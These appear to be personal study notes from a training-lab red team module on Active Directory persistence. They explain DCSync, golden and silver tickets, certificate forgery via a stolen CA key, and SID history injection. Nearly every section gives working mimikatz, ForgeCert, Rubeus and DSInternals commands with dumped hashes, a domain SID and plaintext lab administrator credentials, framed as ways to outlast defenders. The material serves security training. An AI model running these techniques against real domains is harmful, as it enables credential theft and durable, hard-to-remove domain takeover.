---
title: "Active Directory - Persistance"
date: 2026-11-14
weight: 20
---

## 1. Introduction
- During our attack against AD, we need to make sure that we deploy persistence. This will ensure that the blue team can't kick us out by simply rotating some credentials. 
- As mentioned before, the process of compromising AD is cyclic. We would deploy persistence as we compromise the AD estate and not just at the very end. This ensures that if one of our positions gets burnt by the blue team, we have several fallbacks. 
- In this persistence phase, we will use several techniques that can ensure our gained access cannot simply be revoked. These persistence techniques are dependent on the specific permissions and privileges we have acquired thus far.

## 2. Persistance Through Credentials
- Together with a low-privileged credentials, you will be provideed with Domain ADministrator credentials. What luck! When discussing persistence techniques, you will use the privileged credentials to perform the persistence technique on low privileged credential set. 
- za.tryhackme.loc\Administrator:tryhackmewouldnotguess1@
- since we provide with full access over entire domain, we cant really hide any flags or force you to make sure you perform these persistence techniques before answering questions. It is however encourated that you take your time to work through these methods, as they will pay dividends in return on a red team assessments when the blue team start kicking us out.
- The first and least reliable technique that we will discuss is credentials. Serveral of lateral techniques discussed in previous lessons would have resulted in the attacker gaining access to credentials.

### 2.1 DC Sync
- A DCSync attack is a post-exploitation technique in AD where an attacker pretends to be a legitimate Domain Controller (DC) to pull password hashes and Kerberos keys directly from another DC.
- Instead of logging into the DC interactively, dropping malware on it, or manually extracting the NTDS.dit database file, the attacker abuses AD’s built-in replication mechanism over the network.
- In multi-DC environment, Domain controllers constantly sync updates with each other using **Directory Replication Service Remote Protocol (MS-DRSR)**.
    - Required Permissions: To initiate a replication request, an account must hold specific replication privileges on the domain object:
        - `DS-Replication-Get-Changes`
        - `DS-Replication-Get-Changes-All`, (By default, Domain Admins, Enterprise Admins, and DC computer accounts have these rights, though misconfigured service accounts or delegated permissions can also hold them.)

    - Impersonating a DC: Using tools like Mimikatz (lsadump::dcsync) or Impacket's secretsdump.py from a compromised machine, the attacker sends a `GetNCChanges RPC call` to a target Domain Controller.

    - The Data Dump: Because the request comes from an authorized account using a valid protocol, the target DC trusts the request and sends back the requested `account secrets`—including NTLM password hashes and Kerberos AES keys—straight to the attacker's machine.



### 2.2 Not all credentials are created Equal
- Before starting our DC sync attack, let's first discuss what credentials we could potentially hunt for. While we should always look to dump privileged credentials such as those that are members of the Domain Admin group, these are also the credentials that will be rotaated first.
- As such, if we only have privileged credentials, it is safe to say as soon as blue team discovers us, they will rotate those accounts, and we an potentially lose our access.
- The goal then is to persist with near privileged credentials. We dont always need the full keys to the kingdom, we just need enough keys to enusre we can still achieve goal execution and always make blue team look over their shoulder. As such, we should attempt to persist through credentials such the following.
    - **Credentials that have local administrator rights on several machines:** Usually organisations have a group or two with local admin rights on almost all computers. By harvesting the credentials of members of these groups, we would stil have access to most of the computers in the estate.
    - **Service accounts that have delegation permissions:** With these accounts, we would be able to force golden and silver tickets to perform kerberos delegation attacks. Eg: `krbtgt Account` used to forge Golden Ticket, which grants persistant, unrestricted Domain Admin access across the network.
    - **Accounts used for privileged AD services:** If we compromise accounts of the privileged services such as Exchange, Windows SErver Update services (WSUS), or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.

- when it comes to what credentials to dump and persist through, it is subject ot many things. YOu will have to get creative in your thinking and take it on case-by-case basis. However, for this room, we are going to have some fun, make the blue team sweat, and dump every single credential we can get ou hands on!

### 2.3 DCSync All

- We will be using mimikatz to harvest credentials. SSH into THMWRK1 using the DA account and load mimikatz.
```powershell
C:\Tools\mimikatz_trunk\x86\mimikatz.exe
# Not only DCs, but Domain ADmins also have a capability to do a fake replication request, and fetch the user's hashes. 
# With /user:<username>: Mimikatz formats the underlying Active Directory replication request (GetNCChanges) to target only the Distinguished Name (DN) of that exact object. The Domain Controller evaluates the request and streams back the account secrets (like the NTLM hash and AES keys) solely for that individual low priviligaed user.
$ lsadump:dcsync /domain:za.tryhackme.loc /user:sylvia.robinson
# sam account details and hashse                                         
# SAM Username         : sylvia robinson     
# Account Type         : 30000000 ( USER_OBJECT )                          
# User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
                              
# Credentials:                                                      
#   Hash NTLM: 35c1630e7cc1b440889d8904ec6dd06a                              
#     ntlm- 0: 35c1630e7cc1b440889d8904ec6dd06a                           
#     lm  - 0: a99450ef08a5e092e2fe95bf307a9c1b                      

# Primary:Kerberos-Newer-Keys
#       aes256_hmac (4096) : f1f88e45cb56c08bed4343c8efd13f8ff00bd1ec70976f625bbc1d4371858c48
#       aes128_hmac (4096) : 5e681da5641e8064e66c5542e66646a9      
#       des_cbc_md5 (4096) : 92021f868926fed5              

# We can verify this NTLM hash, and see if its corresponding to the her password.
printf '%s' "silvia_password" | iconv -t UTF-16LE | openssl dgst -provider legacy -md4
# Ntlm hash generated here should be same as the ntlm captured by dc-sync
```
![DC Sync Attack](/resources_redteam/dc_sync_attack.png)

- This is great and all, but we want to DC sync every single account. To do this, we will have to enable logging on mimikatz.
```powershell
C:\Tools\mimikatz\x86\mimikatz.exe
$ log za_domain_dcdump.txt
$ lsadump::dcsync /domain:za.tryhackme.loc /all

# once you dump has completed, look for ntlm hash for service accout `krbtgt`
# This will allow us to generte the golden ticket.
Select-String -Path .\za_domain_dcdump.txt -Pattern "krbtgt" -Context 0,10
```
- Thi will take a bit of time to complet. Once done, exit Mimikatz to finalize the dump find and then you can download <username>_dcdump.txt. You can use `cat za_domain_dcdump.txt | grep "SAM Username"` to recover all the usernames and `cat za_domain_dcdump.txt | grep "Hash NTLM"` for all the hashes.
- We can now eighter perform an offline password cracking to recover the plain text crdentials or simple perform a pass the hash attack with mimikatz.


## 3. Persistance Through Tickets
- AS discussed in the previous tasks, we often want to persist through service accounts with delegation to forge silver and golden tickets.
- But what are those exactly, and why does every blue team tabletop exercise end with someone shouting:"Flush all golden and silver tickets"

### 3.1 Tickets to the Chocolate Factory
- Before getting into golden and silver tickets, we first need to do a quick recap on kerberos authentication. The diagram below shows the noraml flow for kerboros authenticaion.
![Kerberos Authentication](/resources_redteam/kerberos_authentication.png)

 
- **Step1:** THe client makes an AS-REQ [IntialRequest[`PA-DATA=current timestamp encrytped by client's ntlm/aes hash`]] to KDC on the DC to request TGT.

- **Step2:** The DC looks up the user account, pull their password hash from database, and attempts to decrypt that timestamp. If it decrypts successfully and timestamp is fresh, the DC knows for a fact that sender knows the password, and it proceeds to issue TGT.

    - Authenticatin Service Request [AS-REQ] is very first packet sent from client to the KDC over port 88 (UPD or TCP), it contains
        - Client Name (`cname`): Who is asking for TGT. (eg: `any user`)
        - Server Name (`sname`): What ticket is being requested, for AS-REQ, its always Ticket Granting service (krbtgt) which provides the RGT.
        - Pre-authentication Data (`pa-data`): this is where encrypted timestamp lives.
        - Ticket flags: preferences for the requested TGT (asking either forwardable or renewable ticket)
        - Supported Encryption types (`e-type`): A list of cryptographic algorithms the client's machine supports.
    - The overall AS-REQ is sent in plaintext across the network, so anyone caputuring network traffic can read almost everything inside request like cname, sname, domain name, client supported algorithms etc.
    - The only piece inside AS-REQ - timestamp nested in PA-DATA filed is encrypted.


- Entire payload of issued TGT by KDC during pre-auth, is encrypted with the `krbtgt` account's NTLM/AES key, only DC can decrypt and validat later.
- TGT contains server vital pieces of data
    - `Session Key`: A freshly generated key shared between client and KDC. Used to encrypt next requests (like `TGS-REQ`), ensuring no evesdropping.
    - `cname`: username and domain of account that authenticated (eg: `Administrator@za.tryhackme.loc`), proving to the KDC who holds this ticket when they return to request downstram service tickets.
    - `sname`: Always set to `krbtgt/za.tryhackme.loc`, identifies the ticket as master entry pass meant exclusively for tickt granting service.
    - `ticket flags`: configuration bits such as Forwarbable, renewable and intial
    - `Validity Timestamps`: start time, end time, renew-till limits.
    - `The PAC`: Privilege Attribute certificate, AD specific block containing your user SID, group memberships, and security context. This is what backend servers check during authorization to see if user belong t sensitive groups like `Domain Admins`.

        - Note: Understanding PAC is crucial. When attacker forges ticket using krbtgt, injecting or atlering SIDs inside PAC is what allows them to claim high-privileged group memberships, tricking target servers into granting full administrative access.



- **Step3:** When a user wants to access specific resource on network (like file share, database etc), he must ask the KDC for **Service Ticket** using **TGS-REQ**. To make this request, user must use the TGT he received during the intial authentication phase.
- A `TGS-REQ` packet sent to port 88 on DC includes several components
    - `TGT`: attaches the TGT it received earlier, because TGT encrypted with the `krbtgt` account's secret key, only DC can open and read it to verify the user's identity.
    - `Authenticator`: Since anyone intercepts TGT on the wire could theoretically caopy it, the client must prove it actually wons the session key inside TGT. The client generates an Authenticator, which contains the current timestamp, encrypted using the `Session key` shared between the client and KDC.
    - `sname`: A specific identifer of resource the user wants to access. (eg: cifs/thmserver1.za.tryhackme.loc, wsman/thmdc.za.tryhackme.loc)
    - `Ticket flags & encryption preferences`
    - `Additional ticket`: If the request is part of a complex operation like `S4UProxy`, this field is where intermediate S4U2Self ticket attached so KDC can inspect it.
- **Step4:** If everything checks out, the KDC responds with a `TGS-REP`, handing over a brand-new `Service Ticket encrypted exclusively with the password hash or key of the requested service hosting that resource`.


- Once user recives Service Ticket (TGS) from KDC, he no longer needs to talk to the DC. It interacts directly with the target server hosting that requested service. (eg: `WSMAN/THMSERVER1.za.tryhackme.loc`)

- **Step5:** The user presents this TGT to the target applicatioin/service through `AP-REQ` (application request.), Inside this request, it includes two core items:
    - `The Service Ticket (TGS)`: the exact ticket handed to you by the KDC during `TGS-REP` step. 
    - `A Fresh Authenticator`

- **Step6:** How the Target Service Proceses AP-REQ
    - when target service receives the AP-REQ, the service itself executes these exact operations
        - Unwrapping and Decrypting the ticket (TGS): Target service uses its own secret key (stored in Lssas) to decrypt TGS payload. If decryption succeeds, service instatly knows the ticket was genuinely issued by KDC.
        - Extracting the Sessin key and Client Identity: the service recovers `sessionkey`. It reads `cname`, `PAC` inside TGS.
        - Veryfing Authentictor
        - Building Local Access Token, and Enforcing permissions: Service Takes Identity, PAC and constructs a local access token. Finally, it compares that token against the target resource's Acess Control to decide whether grant or deny access.


- With all of that background theory being said, it is time to look into Golden and Silver tickets.


### 3.2 Golden Tickets
- **Golden Tickets are forged TGTs.** What this means is we bypass steps 1 and 2 of diagram of above: Kerberos authentication, where we prove to the DC who we are. Having a valid TGT of privileged account, we can now request a TGS for almost any service we want.
- In order to forge a golden ticket, we nned `KRBTGT` account's password hash so that we can sign a TGT for any user account we want. Some interesting notes about the Golden tickets
    - By injecting at this stage of kerberos process, we dont need the password hash of account we want to impersonate since we bypass that step. The TGT is only used to prove that the TGT is declared valid no matter its contents.
    - Speaking of contents, the KDC will only validate the user account specified in TGT if it is older than 20 minutes. This means we can put a disabled,  delted or non-existent account in TGT and it will be valid as long as we ensure the timestamp is not older than 20m.
    - Since the policies and rules for tickets are set in TGT itself, we could overwrite the values for instance, ensure that our TGT is valid for 10 years, granting us persistence.
    - By default, the KRBTGT account's password never changes, meaning once we have it, unless it is manually rotated, we have persistent acces by generating TGTs forever.
    - The blue team would have to rotate the KRBTGT account's password twice, since the current and  previous passwords are kept valid for the account. This is to enusre that accidental rotation of the password does not impact services.
    - Rotating the KRBTGT account's password is an incredebly painful process for the blue team since it will cause signinficant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since timestamp is till valid) and thus wont auto request a new TGT.
    - We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for blue team to detect.

- Apart from the KRBTGT account's hash, we only need the domain name, domain SID, and user ID for th eperson we want to impersonate. If we are in position where we can recover the KRBTGT account has, we would already be in position where we can recover other pieces of the required information.

### 3.3 Silver Tickets
- **Silver tickets are forged TGSs.** So now, we skip all communication (Step1-4), we would have had with the KDC on DC and just interface with the service we want access to directly. Some interesting notes about the Silver tickets.
    - The genreated TGS is signed by the machine account of the host we are targeting.
    - The main differnce between the Golden and Silver Tickets is the number of privileges we acquire. With a Silver Ticket, since we only have accesss to password has of the machine account of server we are attacking, we can only impersonate users on that host itself. The silver Ticket's scope is limited to whatever service is targeted on specific server.
    - Since the TGS is forged, there is no associated TGT, meaning DC was never contacted. This makes the attack incredebly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.
    - Since persmissions are determinted through SIDs, we can again create a non-existing user for our silver ticket, as long as we enusre the ticket has the relevant SIDs that would place theuser in the host's local administrator group.
    - The Machine account's password is usually rotated every 30 days, which would not be good for persistance. However, we could leverage the access TGS provides to gain access to host's registry and alter the parameter that is responsible for the password rotation of machines account. There by ensureing the machine account remains static and granting us persistance on the machine.
    - While only having access to single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.


### 3.4 Forging Tickets For Fun and Profit.
- Now that we have explained the basics for golden and Silver tickets, let's generate some.
- You will need the NTLM hash of the KRBTGT account, which you should now have due to the DC Sync perfomed in the previous task. 
- Furthermore, make note of the NTLM hash associated with the THMSERVER1 machine account since we will need this one for our silver ticket. You can find this information in the DC dump that we performed.
- The last piece of information we need is the domain SID. Using our low privileged SSH terminal on THMWRK1, we can use the AD-RSAT cmdlet to recover the information.
```powershell
# Collected creds for Golden and Silver ticket from previous tasks
# KRBTGT service accout & THMSERVER1 machine accountt
# krbtgt:16f9af38fca3ada405386b3b57366082
# THMSERVER1$:4c02d970f7b3da7f8ab6fa4dc77438f4

# Get the Domain SID
Get-ADDomain | Out-String -Stream | Select-String -Pattern "DomainSID"
#S-1-5-21-3885271727-2693558621-2658995185
```
- AS we have now required information, we can relaunch mimikatz.
```powershell
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
# parameters
# /admin: username we want to impersonate, doesnt need to be valid
# /domain: fqdn fo the domain we want ot generate ticket for
# /id: the user RID, by default, mimikatz uses RID 500, which is a default Administrator account RID
# /sid: Sid of the domain
# /krbtgt: the ntlm hash of the krbtgt account
# /endin: the ticket lifetime in mimuntes. by default= 10 years.
# /renewmax: the maximum ticket lifetime renewale.
# /ptt: this flag tell mimikatz ticket to inject the ticket directly into the session, meaning it is ready to be used.
$ kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
# Golden ticket for 'ReallyNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session

# lets verify that the golden ticket is working by runnig the dir
dir \\thmdc.za.tryhackme.loc\c$\
```
- Even if the golden ticket has an incredebly long time, the blue team can still defend against this by simple rotating KRBTGT password twice. If we really want to dig our roots, we want to generate silver tickets, which are less likely to be discovered and significantly harder to defend against since the passwords of every machine account must be rotated. We can use the following mimikatz command to generate silver ticket.
```powershell
C:\Tools\mimikatz\x64\mimikatz.exe
# generate the service ticket and inject it into the session.
# paramets
# /rc4 - The NTLM hash of the machine account of our target. 
# /service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
$ kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
# Golden ticket for 'StillNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session 

# lets verify that the silver ticket is working by runnig the dir on thmserver1
dir \\thmserver1.za.tryhackme.loc\c$\
```

## 4. Persistence through Certificates
- The last two persistence techniques relied on credentials. While we can definetely make blue team's lives complicated, they can ultimately rotate enough credentials to kick us out. So while these techniques are great to keep the blue team busy while we keep them busy, we should look to use persistence techniques that are credential agnostic, meaning the rotation of these will not kick us out. The first of these we will be looking at is certificates.

### 4.1 The Return of AD CS
- With NTLM/Kerberos authentication, we supposed to prove the DC that we have password/hash. (Client send a request containing encrypted_timestamp+UPN, KDC fetches hash for given UPN, try to decrypt and check validity.)

- With certificate-based authentication:
    - AD-CS, at its heart, is a `Certificate Authority (CA)`, and server where AD-CA installed called as `CA SErver`.
    - AD-CS uses certificate templates, this allows the Administrators of AD to sign certificates while defining their own values for certificates fields such  SAN, CN etc.
    - SAN field in certificate is used by DC to identify individual account.
    - So, Administrator of AD-CS, have full control on SAN field while signing certificate, allowing them to impersonate any Account.
    - Unlike NTLM/Kerberos where DC fetches User's hash to authenticate them, DC do not store/retrive anything incase of certificate logins - It operates based on certificate and signature.
        - User sends request to DC i.e [user certificate + timestamp signed with user's private key.]
        - DC looks at certificate, verifies if its signed by approved CA, takes public key from certificate, verifies timestamp signature.
        - If all goes well, DC extract SAN,PAC and replies the TGT.

    - So, AD-CS (CA issuer) puts UPN into SAN field, meaning if someone can manipuate or exploit this process, they can impersonate anyone. Lets say if certicate template in AD-CS allows user requesting the certificate to supply their SAN (instead CA auto generating it based on who logged in), a standard, low privileged user can write `administrator@za.tryhackme.loc` into CSR.

    - So, If attacker comprises a CA (stealing CA's private key or abused templates like ESC1), they becomes an unstoppable god across the entire forest.


- Previously, we leveraged certificates to become Domain ADmins. However, certificates can also be used for persistance.
- All we neeed is a valid certificate to request TGT. The beauty of this ? we can continue requesting TGTs no matter how many rotations they do on the account we are attacking. The only way we can be kicked out is if they revoke the certificate we generated or if it expires. Meaning probably have persistant access by default for rougly the next 5 years.

- Depending on our access, we can take it another step further, we could simpley steal the privite key of the root CA's certificate to generate our own certificate whenever we feel like it. Even worse, since these certificates were never issued by CA, the blue team has no ability to revoke them. This would be even worse for the blue team since it would mean a rotation of CA, meaning all issued certificates would have to be revoked by the blue team to kick us out.
- Imagine you've just spent the last two days performing domain takeback by rotating the credentials of every single privileges account, resetting all the golden and silver tickets, just to realise the attackers persisted by becoming your CA. Yikes!


### 4.2 Extracting the Private Key.
- The private key of the CA is stored on the server where AD-CS is installed.
- If the private key is not protected through hardware-based protection methods such as `Hardware Security Module (HSM) `, which is often the case for organizations that just use AD CS for internal purposes where private key is protected by `Machine Data Protection API (DPAPI)`. 

- **HSM** is physical, dedicated cryptographic chip designed exclusively to safeguard digital private keys. We cannot "crack" it via software, malware, or remote access. More importantly, private key is generated inside the HSM's secure processor, and is hardwired never to leave the hardware in plaintext. Breaking an HSM, requires advanced physical labaratory attacks (like micro-probing, laster fault injection or side channel power analysis), not remote hacking.
- **DPAPI:** 
    - Cryptography in windows relies on APIs and software modules to handle encryption, signing and key storage.
    - `CryptoAPI (CAPI)` - Legacy Windows Cryptographic Framwork
    - `Cryptography Next Generation (CNG) & Key Storage Provider (KSP)` - The modern windows architecture replacing CAPI. A KSP is the software module for generating and manageing priviate keys.
    - When a CA is running with a standard Software KSP (default on windows server), the private key is stored on disk and protected by DPAPI tied to the local SYSTEM account.
    - So, System account holds the master keys required to unwrap the DPAPI-protected containers holding private key.
    - So, System Account running `mimikatz` can possibly extract the CA private key.
    ```powershell
    # Use SSH to authenticate to THMDC.za.tryhackme.loc using Administrator credentials, 
    # and create a unique directory for your user, move to it, and load mimikatz.
    #ssh Administrator@thmdc.za.tryhackme.loc 
    Cd $HOME
    mkdir <username>; cd <username>;
    C:\Tools\mimikatz_trunk\x64\mimikatz.exe
    # lets see if we can view the certificates
    # certificates are here in pfx format = bundle of private key, certificate
    $ crpto::certificates /systemstore:local_machine
    # displays the CA certificate on DC
    # we can also note that some of these certicates were set not to allow us to export the key.
    # Without this priviate key of CA, we would not be able to generate new clients certificates.
    # Luckily, mimikatz allows us to unwrap the DPAPI containers holding private key of CA.

    # Elevates Mimikatz's process token to include the SeDebugPrivilege right.
    $ privilege::debug
    # Instructs to interact with the legacy CryptoAPI (CAPI) subsystem
    # It loads CAPI libraries into memory so Mimikatz can scan, locate, and manipulate older RSA/Schannel cryptographic service provider (CSP) key containers stored on the machine.
    $ crypto::capi

    # Instructs also hook into the modern Windows CNG architecture and Key Storage Providers (KSPs)
    $ crypto::cng

    # trigger the extraction and unwrap the container holding the CA's private key
    # CA's private key and certificate live in the Local Machine store
    $ crypto::certificates /systemstore:local_machine /export
    # the exported certificates are stored in both PFX, DER format to the disk.
    # Identify the CA cert bundle.
    
    # za-THMDC-CA.pfx
    # local_machine_My_1_za-THMDC-CA.pfx

    ```

- Mimikatz is the simplest tool to use, but if you want to experiance other tools, have a look [here](https://pentestlab.blog/2021/11/15/golden-certificate/).
- In order to export the certifcate as pfx, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
- Download or copy this certificate to your AttackBox using SCP, and then copy it to your low-privileged user's home directory on `THMWRK1`.

### 4.3 Generating our own certificates
- Now that we have the CA certificat pfx bundle, we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) Tool to forge a Client Authenticate certificate for any user we want.
```powershell
# Forge Client Authentication Cert for Administrator@za.tryhackme.loc
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 


# Now request the DC for TGT using above generated certificate, which is trusted.
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.73.101


# Now we can use Mimikatz to load the TGT and authenticate to THMDC:
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
$ kerberos::ptt administrator.kirbi
$ exit

# Verify if we can now access DC infrastructure.
dir \\THMDC.za.tryhackme.loc\c$\
```

### 4.4 We are no longer friends with Blue TEam
- Certificate persistance is significantly harder to defend against. Even if you roate the credentials of the comprised account, the certificate will still be valid. The only way to remove the persistance is to issue a revocation of the certificate. However, this would only be possible if we generated the certificate through legitimate channels. 
- Since we exported the CA and generated the certificate ourselves, it does not appear on AD-CS's list of issued certificates, meaning the blue team will not be able to revoke our certificate.
- So what's the only solution to remove the persistence? Well, this is why we are no longer friends. They will have to revoke the root CA certificate. But revoking this certificate means that all certificates issued by AD CS would all of a sudden be invalid. Meaning they will have to generate a new certificate for every system that uses AD CS. You should start to see why this type of persistence is incredibly dangerous and would require full rebuilds of systems if performed.




## 5. Persistence through SID History.
- The security identifiers (SIDs) have been discussed before. But for a recap, SIDs are used to track the security principal and account access when connecting to resoucres. There is, however, an interesting attribute on accounts called `SID history`.
- The legitimate use case of SID history, is to enable access for an account to effectively be cloned to another. This becomes useful when an organization is busy performing an AD migration as it allows users to retian access to original domain while they are being migrated to new one.
- In new domain, the user would have a new SID, but we can add user's existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account.
- While SID history is good for migratins, we, as attackers, can also abuse this feature for persistence.

### 5.1 History Can Be Whatever We Want It To Be
- The thing is, SID history is not restricted to only including SIDs from other domains. With the right permissions, we can just add a SID of our current domain to the SID history of an account we control.
- Some interesting notes about this persistance:
    - We normally require Domain ADmin privileges or the equivalent thereof to perform this attack. 
    - When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determine the privilege associated with the account. This includes group SIDs.
    - We can take this attack step further if we inject the Enterprice Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in forest.
    - Since the SIDs are added to the user's token, privileges would be respected even if the account is not member of actual group. Making this a very sneaky method of persistance. We have all the permissions we need to compromise the entire domain, but our account can simply be a normal user account with membership only to the domain users group. We can up the sneekiness to another level by always using this account to alter SID history of another account, so the intial persistance vector is not easily discovered and remedied.

### 5.2 Forging History
- Get an SSH session on THMDC using the Administrator creds.
- Before we forge SID history, let's just first get some information regarding the SIDs, 
```powershell

# let's make sure that our low-privileged user does not currently have any information in their SID history.
Get-ADUser <low_priv_user> -properties sidhistory,memberof
# MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
# SIDHistory        : {}


#Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:
Get-ADGroup "Domain Admins"
# SID               : S-1-5-21-3885271727-2693558621-2658995185-512



# We could use something like Mimikatz to add SID history. 
# However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. 
# In this case, we will use the DSInternals tools to directly patch the ntds.dit file, the AD database where all information is stored:

# NTDS database is locked when the NTDS service is running. 
# In order to patch our SID history, we must first stop the service. 
# You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.

Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName '<low_priv_user>' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds  

# After these steps have been performed, let's SSH into THMWRK1 with our low-privileged credentials 
# and verify that the SID history was added and that we now have Domain Admin privileges:
Get-ADUser <low_priv_user> -Properties sidhistory 
#SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512} 
























